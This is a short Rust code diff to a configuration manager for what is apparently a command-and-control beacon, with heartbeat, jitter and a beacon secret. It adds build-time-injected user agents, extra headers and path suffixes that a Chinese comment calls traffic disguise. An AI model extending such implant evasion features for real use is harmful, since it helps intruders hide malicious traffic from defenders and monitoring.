@@ -10,6 +10,10 @@ pub struct ConfigManager {
     pub heartbeat_interval_ms: u64,
     pub jitter_percent: f64,
     pub beacon_secret: String,
+    /// 构建时注入的流量伪装（UA/附加头/路径后缀），注册前生效。
+    pub user_agents: Vec<String>,
+    pub extra_headers: Vec<String>,
+    pub path_suffixes: Vec<String>,
 }
 
 impl ConfigManager {
@@ -23,6 +27,9 @@ impl ConfigManager {
             heartbeat_interval_ms: 3000,
             jitter_percent: 0.2,
             beacon_secret: String::new(),
+            user_agents: Vec::new(),
+            extra_headers: Vec::new(),
+            path_suffixes: Vec::new(),
         };
 
         // Apply injected config first (embedded at build time)
@@ -33,6 +40,9 @@ impl ConfigManager {
             if !ic.beacon_secret.is_empty() {
                 cfg.beacon_secret = ic.beacon_secret;
             }
+            cfg.user_agents = ic.user_agents;
+            cfg.extra_headers = ic.extra_headers;
+            cfg.path_suffixes = ic.path_suffixes;
         }
 
         // CLI args override
